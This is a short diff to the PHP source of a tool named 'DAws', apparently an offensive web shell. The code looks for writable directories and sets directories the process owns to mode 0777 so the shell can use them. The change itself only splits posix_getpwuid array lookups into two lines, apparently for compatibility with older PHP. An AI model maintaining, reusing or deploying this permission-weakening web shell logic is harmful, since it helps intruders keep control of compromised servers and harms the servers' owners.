@@ -209,7 +209,8 @@ function recursive_glob($path) {
 			return $path;
 		} else if ((installed_php("fileowner")) && (installed_php("posix_getpwuid"))) {
 			//we can chmod a direcotry that we own and gift it to our beloved DAws!
-			$fileowner = posix_getpwuid(fileowner($path))["name"];
+			$fileowner = posix_getpwuid(fileowner($path));
+			$fileowner = $fileowner["name"];
 			if($_SESSION["process_owner"] == $fileowner) { //we own that folder
 				if (chmod($path, 0777)) { //successfully chmoded
 					return $path;
@@ -234,7 +235,8 @@ function recursive_iterator($location) {
 				return realpath($path);
 			} else if ((installed_php("fileowner")) && (installed_php("posix_getpwuid"))) {
 				//we can chmod a direcotry that we own and gift it to our beloved DAws!
-				$fileowner = posix_getpwuid(fileowner($dir))["name"];
+				$fileowner = posix_getpwuid(fileowner($dir));
+				$fileowner = $fileowner["name"];
 				if($_SESSION["process_owner"] == $fileowner) { //we own that folder
 					if (chmod($dir, 0777)) { //successfully chmoded
 						return realpath($path);
@@ -396,7 +398,8 @@ if (!isset($_SESSION["logged_in"])) {
 //finds current process's owner
 if (!isset($_SESSION["process_owner"])) {
 	if (installed_php("posix_geteuid")) { //Linux
-		$_SESSION["process_owner"] = posix_getpwuid(posix_geteuid())["name"];
+		$_SESSION["process_owner"] = posix_getpwuid(posix_geteuid());
+		$_SESSION["process_owner"] = $_SESSION["process_owner"]["name"];
 	} else { //Linux and Windows
 		$_SESSION["process_owner"] = getenv('USERNAME');
 	}
